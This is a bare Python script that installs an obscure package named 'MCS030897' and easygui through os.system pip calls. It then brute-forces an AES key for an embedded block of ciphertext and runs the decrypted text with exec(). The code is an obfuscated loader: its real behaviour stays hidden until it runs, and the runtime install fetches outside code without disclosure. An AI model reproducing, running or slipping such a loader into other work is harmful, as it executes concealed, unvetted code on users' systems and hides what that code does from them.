from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import os
os.system("pip3 install MCS030897")
from MCS030897 import *
os.system("pip3 install easygui")
import easygui
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'^>\x07(Y\xc6v\x80\xd3\x83[\x1d$C\x15\x863X\xcfq\xd1\x87\xa1\xee\xee\x1e\xd1s\xdc\xa5\x11\xafWn\xf5\x1e<\xc1\xb63B\xf4\xf0\x93,F\xb1\x14\x00"\x0f\xb3\x90L\xcal\xf7\x1f\x8eNr\xaa0j\x95\xc6J\xbc\x9bK\xf5\xf1-\xdb\xb4)\x08n"\xd5Ay\x8c|.\x0b\xb5\x04_\xef\x07\xbey\xb1\xa36\x136\xa9\xd6\x01\x89\xa5\x1486\xc0\x8f\xe7\xdf\xef\x168&\xe6\\\xfb\x10]\x82\x06\x8c\x99\x1eU\xd5\x7f\xbb\'ML0\xfc*,\xf3\x87\x9e]\xae\xd5\x14\xc0\xc0\x0c\xe3E!\x82\x01L\xcd\xef@\xbc`\x84J8\xe0^\xff\xbc>gxG\xa0l)[\xc6\x95\xe9\x01\xdd`0\xf2m&\xd89D\xca\x85\xd5\'l\xf6\n}=\xc6\xa6\x12j\x12c\xf9\xb8(~x\xf4kx\x1d\xeb\xb2\xe2\x8a:V\xe3T\xfc\xac\xc3\xa0e\xb0ij\xd4\x82I\x88u\x8c\x0e|\xa9\xd8s0N!\xabl\x80\xb6\xf4\x1at5\xb8\xf3\x8a\xd5\xab\xca5\x8b\xc9\x11\x9c\xcaYQ\xd9\xa8@\xeaF\xbc\x99_\x89\x8f\xdch\xe6\xe8\x00\x92\xfb\xebli\xac\x11\r\x06\x97\xbe\x93\x01\xb3@\xc7]\x04Z\xff\xb6&$}\xc1\xa8+@\xe7\x95\xaeh\x92\xdb\xb4\xfeh\x06i}+\xf9/\xe2\xe12B&;\xaeg\xf0"l\xb0\xe9Y\xdeL\x0f\x7f\x7f\xb5\x84\x0eB\xc6\x07o\xa6\xe15,\xc9W\x1d)]\xfb\xe8\xde\xf4\xa1\xc5\xa48\xd5\xc8\xb7\xc3\xfb\x8c\xf2Ns\xda\xed5]\x84\x04]\x01\xfc^{\xef\xbb\xc7\x10\x866\xa9\x13^\xe6\x97f#\xceBQ\x9d\x1ehV\xd8\xa6\x14U\xf7\x02(6\xf2\x93P\xc4DB\xa0'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
